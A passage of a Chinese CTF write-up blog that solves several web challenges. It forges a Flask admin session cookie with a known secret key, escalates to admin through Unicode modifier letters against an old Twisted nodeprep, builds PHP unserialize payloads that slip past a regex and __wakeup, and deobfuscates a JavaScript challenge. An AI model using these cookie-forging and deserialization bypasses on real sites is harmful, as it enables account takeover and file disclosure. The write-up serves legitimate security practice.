class="hljs-number">6085</span>0c9ee93ea2aa3afaf&#x27;, &#x27;image&#x27;: b&#x27;QgqS&#x27;, &#x27;name&#x27;: &#x27;123&#x27;&#125;<br></code></pre></td></tr></table></figure>

<p>然后伪造admin的session</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;ef01a11ab07dcfc5c410c3c49a740e<span class="hljs-number">936132</span>5cb7bee207c6a22ce8f<span class="hljs-number">5040</span>f<span class="hljs-number">2277</span>8ceccb6ea3be66a<span class="hljs-number">3662</span>e2b<span class="hljs-number">1261</span>ebeaf<span class="hljs-number">7803</span>3a<span class="hljs-number">0587</span>a502a<span class="hljs-number">4963</span>2a0c9a5fc<span class="hljs-number">3111</span>8&#x27;, &#x27;csrf_token&#x27;: b&#x27;<span class="hljs-number">7332</span>f44b<span class="hljs-number">71781592</span>2ad<span class="hljs-number">6085</span>0c9ee93ea2aa3afaf&#x27;, &#x27;image&#x27;: b&#x27;QgqS&#x27;, &#x27;name&#x27;: &#x27;123&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;<br></code></pre></td></tr></table></figure>

<p>放入工具 设置密钥 加密</p>
<figure class="highlight profile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs profile">python3 .\flask_session_cookie_manager3.py encode -t &quot;&#123;&#x27;_fresh&#x27;: True, <span class="hljs-string">&#x27;_id&#x27;</span>: b<span class="hljs-string">&#x27;ef01a11ab07dcfc5c410c3c49a740e9361325cb7bee207c6a22ce8f5040f22778ceccb6ea3be66a3662e2b1261ebeaf78033a0587a502a49632a0c9a5fc31118&#x27;</span>, <span class="hljs-string">&#x27;csrf_token&#x27;</span>: b<span class="hljs-string">&#x27;7332f44b717815922ad60850c9ee93ea2aa3afaf&#x27;</span>, <span class="hljs-string">&#x27;image&#x27;</span>: b<span class="hljs-string">&#x27;QgqS&#x27;</span>, <span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;123&#x27;</span>, <span class="hljs-string">&#x27;user_id&#x27;</span>: <span class="hljs-string">&#x27;10&#x27;</span>&#125;<span class="hljs-string">&quot; -s &quot;</span>ckj123<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure>

<p>得到</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">.eJw<span class="hljs-number">9</span>kMFqwkAQhl-lz<span class="hljs-symbol">NlD3</span><span class="hljs-symbol">NiL4</span>KGStCQwk<span class="hljs-number">8</span>suw-xFrMYka<span class="hljs-number">2</span>IhKhtXfPduLXgahv_j<span class="hljs-number">45</span><span class="hljs-number">-5</span>w-Yw<span class="hljs-number">1</span>ucWlpfxWs<span class="hljs-number">9</span><span class="hljs-name">g0</span><span class="hljs-number">-1</span>heYe<span class="hljs-number">3</span>b<span class="hljs-number">1</span>iCZfHI-YT<span class="hljs-number">82</span>W<span class="hljs-name">G2</span>P<span class="hljs-number">4</span>qyjhgT<span class="hljs-number">1</span>GuHCpOK<span class="hljs-number">85</span>SydV_puG<span class="hljs-name">m8</span>EV<span class="hljs-symbol">NHquytLjwpVKKLmyizsM74</span>yA<span class="hljs-number">3</span>oipRC<span class="hljs-number">6</span>yyTE<span class="hljs-number">2</span>d<span class="hljs-number">70</span>dRZLZFDRa<span class="hljs-number">7</span>scSgmdDJZL<span class="hljs-symbol">nthSavsI6</span>DKPekmFW<span class="hljs-number">08</span>D<span class="hljs-symbol">nlSaQlxegl9</span>S<span class="hljs-number">2</span>wdhthP<span class="hljs-symbol">Nyt4</span>zGB<span class="hljs-number">3</span>Hg-by<span class="hljs-number">8</span>-xPr<span class="hljs-number">1</span>OoIARl<span class="hljs-number">4</span>S-ihT<span class="hljs-number">1</span>boHavKMrW<span class="hljs-number">5</span>uJrzLzp<span class="hljs-number">4</span>l<span class="hljs-number">1</span>j<span class="hljs-number">8</span>FyfhPO<span class="hljs-name">g7</span>Btbb<span class="hljs-symbol">N66</span>rph<span class="hljs-number">29</span>Qvk-H<span class="hljs-number">9</span>ZPx_ctoOMYC<span class="hljs-number">5</span>SmE<span class="hljs-name">G13</span><span class="hljs-name">M9</span>Pr<span class="hljs-number">8</span><span class="hljs-name">G8</span>wQevyIRbIY.YL<span class="hljs-number">7</span>RrA.ztSPmJ<span class="hljs-number">8</span>Wrg-xigAr_j<span class="hljs-number">3</span>XyEwrheY<br></code></pre></td></tr></table></figure>

<p>登录后页面刷新抓包 修改session放包</p>
<h3 id="方法三、Unicode欺骗"><a href="#方法三、Unicode欺骗" class="headerlink" title="方法三、Unicode欺骗"></a>方法三、Unicode欺骗</h3><p>我们再聚焦于routes.py上  在register和login以及change三个模块上均有strlower()函数 而这个函数不是python的自带函数lower()</p>
<p> 找一下这个函数原型或者有没有定义</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function">def <span class="hljs-title">strlower</span><span class="hljs-params">(username)</span>:</span><br><span class="hljs-function">    username =</span> nodeprep.<span class="hljs-built_in">prepare</span>(username)<br>    <span class="hljs-keyword">return</span> username<br></code></pre></td></tr></table></figure>

<p>调用了nodeprep.prepare()函数 继续跟进  发现导入了nodeprep模块 继续跟进发现这是来自twisted库</p>
<p>再注意到requirements.txt里面描述了twisted的版本 <strong>Twisted==10.2.0</strong>  对比官网发现版本已经很低了  存在有Unicode的漏洞 这个点只能说大多数早期开发都难免有这个问题或那个问题  而Unicode作为比较通用的东西 肯定是要测试的  当然有相关的漏洞报告复现出来更具有说服力  而不是像笔者只能复现wp</p>
<p>到这个网站<a target="_blank" rel="noopener" href="https://unicode-table.com/en/search/?q=Modifier+Letter+Capital">Search - Unicode Character Table (unicode-table.com)</a> 挑选字符ᴬᴰᴹᴵᴺ</p>
<p>用这个字符注册 那么此时存入数据库的就应该是大写<strong>ADMIN</strong></p>
<p>那我们登录用ᴬᴰᴹᴵᴺ还是<strong>ADMIN</strong>呢</p>
<p>注意 登录操作也有一次strlower() 所以仍然需要是要假值ᴬᴰᴹᴵᴺ</p>
<p>然后 我们目的是修改掉admin的密码 然后以admin登录 </p>
<p>那么就用change password功能修改密码 此时修改密码时 再次触发strlower()</p>
<p>此时<strong>ADMIN</strong>就变成了amdin覆盖掉数据库原来的值</p>
<p>就可以使用admin登录了</p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210608124512198.png" srcset="/img/loading.gif" lazyload alt="image-20210608124512198"></p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210608124515020.png" srcset="/img/loading.gif" lazyload alt="image-20210608124515020"></p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210608124538163.png" srcset="/img/loading.gif" lazyload alt="image-20210608124538163"></p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210608124723891.png" srcset="/img/loading.gif" lazyload alt="image-20210608124723891"></p>
<p>登录成功和回显证明ᴬᴰᴹᴵᴺ被转义为<strong>ADMIN</strong></p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210608124748298.png" srcset="/img/loading.gif" lazyload alt="image-20210608124748298"></p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210608124805856.png" srcset="/img/loading.gif" lazyload alt="image-20210608124805856"></p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210608124913625.png" srcset="/img/loading.gif" lazyload alt="image-20210608124913625"></p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210608124926624.png" srcset="/img/loading.gif" lazyload alt="image-20210608124926624"></p>
<h3 id="方法四、代码逻辑漏洞"><a href="#方法四、代码逻辑漏洞" class="headerlink" title="方法四、代码逻辑漏洞"></a>方法四、代码逻辑漏洞</h3><p>login函数和change函数都在没有完全check身份的情况下，执行了session有关的赋值</p>
<h2 id="攻防世界Web-php-unserialize"><a href="#攻防世界Web-php-unserialize" class="headerlink" title="攻防世界Web_php_unserialize"></a>攻防世界Web_php_unserialize</h2><p>这题其实很简单</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span> </span>&#123; <br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;index.php&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>) </span>&#123; <br>        <span class="hljs-keyword">$this</span>-&gt;file = <span class="hljs-variable">$file</span>; <br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123; <br>        <span class="hljs-keyword">echo</span> @highlight_file(<span class="hljs-keyword">$this</span>-&gt;file, <span class="hljs-literal">true</span>); <br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123; <br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;file != <span class="hljs-string">&#x27;index.php&#x27;</span>) &#123; <br>            <span class="hljs-comment">//the secret is in the fl4g.php</span><br>            <span class="hljs-keyword">$this</span>-&gt;file = <span class="hljs-string">&#x27;index.php&#x27;</span>; <br>        &#125; <br>    &#125; <br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>])) &#123; <br>    <span class="hljs-variable">$var</span> = base64_decode(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>]); <br>    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="hljs-variable">$var</span>)) &#123; <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;stop hacking!&#x27;</span>); <br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        @unserialize(<span class="hljs-variable">$var</span>); <br>    &#125; <br>&#125; <span class="hljs-keyword">else</span> &#123; <br>    highlight_file(<span class="hljs-string">&quot;index.php&quot;</span>); <br>&#125; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>10行：实例化Demo对象fl4g.php时，__wakeup()会重置file变量</p>
<p>19行：在不区分大小写的情况下 ， 若字符串出现 “o:数字” 或者 “c:数字’ 这样的格式 ， 那么就被过滤。</p>
<blockquote>
<p> preg_match()中<strong>i</strong>表示不敏感大小写 里面匹配字符可以**/—/<strong>和</strong>/b—/b**(只匹配单词)匹配内容</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php">preg_match(<span class="hljs-string">&quot;/php/i&quot;</span>, <span class="hljs-string">&quot;PHP is the web scripting language of choice.&quot;</span>)<br>preg_match(<span class="hljs-string">&quot;/\bweb\b/i&quot;</span>, <span class="hljs-string">&quot;PHP is the web scripting language of choice.&quot;</span>)<br><br><span class="hljs-comment">#从URL获取域名 写法一</span><br>preg_match(<span class="hljs-string">&#x27;@^(?:http://)?([^/]+)@i&#x27;</span>,<span class="hljs-string">&quot;http://www.php.net/index.html&quot;</span>, <span class="hljs-variable">$matches</span>)<span class="hljs-comment">//匹配http://和/划分开的三部分保存到数组</span><br><span class="hljs-variable">$host</span> = <span class="hljs-variable">$matches</span>[<span class="hljs-number">1</span>];<span class="hljs-comment">//提取中间的部分 即www.php.net</span><br>preg_match(<span class="hljs-string">&#x27;/[^.]+\.[^.]+$/&#x27;</span>, <span class="hljs-variable">$host</span>, <span class="hljs-variable">$matches</span>);<span class="hljs-comment">//[^.]+中^匹配一次及以上 [^.]+表示不包含.字符的一个或多个字符 进行匹配两次 即得到php net 中间/. 即用.拼接 得到php.net覆盖到变量$matches</span><br><br><span class="hljs-comment">#URL获取域名 写法二</span><br>preg_match(‘/^(https?:\/\/)?([\da-z\.-]+)\.([a-z\.]&#123;<span class="hljs-number">2</span>,<span class="hljs-number">6</span>&#125;)([\/\w \.-]*)*\/?$/’）<br></code></pre></td></tr></table></figure>

<p> 其他内容 去系统学习一下Perl的正则匹配</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span> </span>&#123; <br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;index.php&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>) </span>&#123; <br>        <span class="hljs-keyword">$this</span>-&gt;file = <span class="hljs-variable">$file</span>; <br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123; <br>        <span class="hljs-keyword">echo</span> @highlight_file(<span class="hljs-keyword">$this</span>-&gt;file, <span class="hljs-literal">true</span>); <br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123; <br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;file != <span class="hljs-string">&#x27;index.php&#x27;</span>) &#123; <br>            <span class="hljs-comment">//the secret is in the fl4g.php</span><br>            <span class="hljs-keyword">$this</span>-&gt;file = <span class="hljs-string">&#x27;index.php&#x27;</span>; <br>        &#125; <br>    &#125; <br>&#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> Dmeo(<span class="hljs-string">&#x27;fl4g.php&#x27;</span>);<br><span class="hljs-variable">$a</span>=serialize(<span class="hljs-variable">$a</span>);<span class="hljs-comment">//o:4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;</span><br><span class="hljs-variable">$a</span>=str_replace(<span class="hljs-string">&quot;o:4&quot;</span>,<span class="hljs-string">&quot;o:+4&quot;</span>,<span class="hljs-variable">$a</span>);<span class="hljs-comment">//绕过正则匹配 具体见博客</span><br><span class="hljs-variable">$a</span>=str_replace(<span class="hljs-string">&#x27;:1:&#x27;</span>, <span class="hljs-string">&#x27;:2:&#x27;</span>,<span class="hljs-variable">$a</span>);<span class="hljs-comment">//绕过__wakeup() 这个漏洞详见反序列化漏洞</span><br><span class="hljs-comment">//var_dump($a);</span><br>var_dump(base64_encode(<span class="hljs-variable">$a</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>这里需要说的是20、21行注释掉得到的<code>O:4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;</code></p>
<p>手动修改后<code>O:+4:&quot;Demo&quot;:2:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;</code>base64加密放到payload不能拿到flag 如下图</p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/2021/06/21/.png" srcset="/img/loading.gif" lazyload alt="image-20210621233717274"></p>
<p>这里有个坑，这里的file变量为私有变量，所以序列化之后的字符串开头结尾各有一个空白字符（即%00），字符串长度也比实际长度大2，如果将序列化结果复制到在线的base64网站进行编码可能就会丢掉空白字符，所以这里直接在php代码里进行编码。类似的还有protected类型的变量，序列化之后字符串首部会加上%00*%00。</p>
<h2 id="攻防世界NaNNaNNaNNaN-Batman"><a href="#攻防世界NaNNaNNaNNaN-Batman" class="headerlink" title="攻防世界NaNNaNNaNNaN-Batman"></a>攻防世界NaNNaNNaNNaN-Batman</h2><p>下载附件 得到源码</p>
<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">&lt;script&gt;<span class="hljs-symbol">_</span>=&#x27;function $()&#123;e=getEleById(<span class="hljs-string">&quot;c&quot;</span>).value;<span class="hljs-built_in">length</span>==<span class="hljs-number">16</span>^be0f23233ace98aa$c7be9)&#123;tfls_aie&#125;na_h0lnrg&#123;e_0iit\&#x27;<span class="hljs-symbol">_</span>ns=[t,n,r,i];<span class="hljs-keyword">for</span>(o=<span class="hljs-number">0</span>;o&lt;<span class="hljs-number">13</span>;++o)&#123;	[<span class="hljs-number">0</span>]);.<span class="hljs-built_in">splice</span>(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)&#125;&#125;&#125;	\&#x27;&lt;input id=<span class="hljs-string">&quot;c&quot;</span>&gt;&lt; onclick=$()&gt;Ok&lt;/&gt;\&#x27;);<span class="hljs-built_in">delete</span> <span class="hljs-symbol">_</span><span class="hljs-built_in">var</span> <span class="hljs-string">&quot;,&quot;</span>docu.)match(/<span class="hljs-string">&quot;];/)!=null=[&quot;</span>	write(s[o%<span class="hljs-number">4</span>]button<span class="hljs-keyword">if</span>(e.ment&#x27;;<span class="hljs-keyword">for</span>(Y <span class="hljs-keyword">in</span> $=&#x27;	&#x27;)with(<span class="hljs-symbol">_</span>.<span class="hljs-built_in">split</span>($[Y]))<span class="hljs-symbol">_</span>=<span class="hljs-built_in">join</span>(<span class="hljs-built_in">pop</span>());<span class="hljs-built_in">eval</span>(<span class="hljs-symbol">_</span>)&lt;/script&gt;<br></code></pre></td></tr></table></figure>

<p>得到乱码 可以使用Sublime Text处理一下</p>
<p>将上面的代码最后的eval函数换为alert后放到www打开</p>
<p>得到源码<img src="https://raw.githubusercontent.com/wo02ie/photo/main/2021/06/23/.png" srcset="/img/loading.gif" lazyload alt="image-20210623182319050"></p>
<p>复制下来格式放到<a target="_blank" rel="noopener" href="https://beautifier.io/%E5%A4%84%E7%90%86%E4%B8%80%E4%B8%8B">https://beautifier.io/处理一下</a> 得到</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">$</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> e = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&#x27;be0f233ac7be98aa&#x27;</span>).value;<br>    <span class="hljs-keyword">if</span> (e.length == <span class="hljs-number">16</span>) &#123;<br>        <span class="hljs-keyword">if</span> (e.match(<span class="hljs-regexp">/^be0f23/</span>) != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">if</span> (e.match(<span class="hljs-regexp">/233ac/</span>) != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">if</span> (e.match(<span class="hljs-regexp">/e98aa$/</span>) != <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-keyword">if</span> (e.match(<span class="hljs-regexp">/c7be9/</span>) != <span class="hljs-literal">null</span>) &#123;<br>                        <span class="hljs-keyword">var</span> t = [<span class="hljs-string">&#x27;fl&#x27;</span>, <span class="hljs-string">&#x27;s_a&#x27;</span>, <span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-string">&#x27;e&#125;&#x27;</span>];<br>                        <span class="hljs-keyword">var</span> n = [<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;_h0l&#x27;</span>, <span class="hljs-string">&#x27;n&#x27;</span>];<br>                        <span class="hljs-keyword">var</span> r = [<span class="hljs-string">&#x27;g&#123;&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;_0&#x27;</span>];<br>                        <span class="hljs-keyword">var</span> i = [<span class="hljs-string">&#x27;it\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-string">&#x27;n&#x27;</span>];<br>                        <span class="hljs-keyword">var</span> s = [t, n, r, i];<br>                        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> o = <span class="hljs-number">0</span>; o &lt; <span class="hljs-number">13</span>; ++o) &#123;<br>                            <span class="hljs-built_in">document</span>.write(s[o % <span class="hljs-number">4</span>][<span class="hljs-number">0</span>]);<br>                            s[o % <span class="hljs-number">4</span>].splice(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>);<br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-built_in">document</span>.write(<span class="hljs-string">&#x27;&lt;input id=&quot;c&quot;&gt;&lt;button onclick=$()&gt;Ok&lt;/button&gt;&#x27;</span>);<br><span class="hljs-keyword">delete</span> _;<br></code></pre></td></tr></table></figure>

<p>代码审计的话 就要懂正则表达式了 ^表示匹配开头 $表示匹配末尾</p>
<p>多个if下来得到payload:<code>be0f23233ace98aa</code> 放到输入框得到flag 但是我没有成功</p>
<p>放到控制台也尝试了 原因未明</p>
<p>那么就直接跳过if 将下面代码放到控制台</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> t = [<span class="hljs-string">&quot;fl&quot;</span>, <span class="hljs-string">&quot;s_a&quot;</span>, <span class="hljs-string">&quot;i&quot;</span>, <span class="hljs-string">&quot;e&#125;&quot;</span>];<br><span class="hljs-keyword">var</span> n = [<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;_h0l&quot;</span>, <span class="hljs-string">&quot;n&quot;</span>];<br><span class="hljs-keyword">var</span> r = [<span class="hljs-string">&quot;g&#123;&quot;</span>, <span class="hljs-string">&quot;e&quot;</span>, <span class="hljs-string">&quot;_0&quot;</span>];<br><span class="hljs-keyword">var</span> i = [<span class="hljs-string">&quot;it&#x27;&quot;</span>, <span class="hljs-string">&quot;_&quot;</span>, <span class="hljs-string">&quot;n&quot;</span>];<br><span class="hljs-keyword">var</span> s = [t, n, r, i];<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> o = <span class="hljs-number">0</span>; o &lt; <span class="hljs-number">13</span>; ++o) &#123;<br>    <span class="hljs-built_in">document</span>.write(s[o % <span class="hljs-number">4</span>][<span class="hljs-number">0</span>]);<br>    s[o % <span class="hljs-number">4</span>].splice(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>)；<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210623183118168.png" srcset="/img/loading.gif" lazyload alt="image-20210623183118168"></p>
<h2 id="BUU-CODE-REVIEW"><a href="#BUU-CODE-REVIEW" class="headerlink" title="BUU CODE REVIEW"></a>BUU CODE REVIEW</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BUU</span> </span>&#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-variable">$correct</span> = <span class="hljs-string">&quot;&quot;</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-variable">$input</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>       <span class="hljs-keyword">try</span> &#123;<br>           <span class="hljs-keyword">$this</span>-&gt;correct = base64_encode(uniqid());<br>           <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;correct === <span class="hljs-keyword">$this</span>-&gt;input) &#123;<br>               <span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-string">&quot;/flag&quot;</span>);<br>           &#125;<br>       &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>       &#125;<br>   &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pleaseget&#x27;</span>] === <span class="hljs-string">&#x27;1&#x27;</span>) &#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pleasepost&#x27;</span>] === <span class="hljs-string">&#x27;2&#x27;</span>) &#123;<br>        <span class="hljs-keyword">if</span>(md5(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;md51&#x27;</span>]) == md5(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;md52&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;md51&#x27;</span>] != <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;md52&#x27;</span>]) &#123;<br>            unserialize(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;obj&#x27;</span>]);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>首先有unserialize参数通过POST变量obj，即参数可控，其次类已经给出，可以利用，最后，类中有魔术方法__destruct 说明这是一道考查了反序列化知识点的题 </p>
<p>题中函数讲解：uniqid()：基于以微秒计的当前时间，生成一个唯一id</p>
<p>MD5的==比较，可以使用哈希比较缺陷和数组绕过</p>
<p>条件$this-&gt;correct === $this-&gt;input构造传引用：</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$a</span>-&gt;<span class="hljs-variable">$input</span>=<span class="hljs-variable">$a</span>-&gt;<span class="hljs-variable">$correct</span>;<br></code></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BUU</span> </span>&#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-variable">$correct</span> = <span class="hljs-string">&quot;&quot;</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-variable">$input</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-function"><span 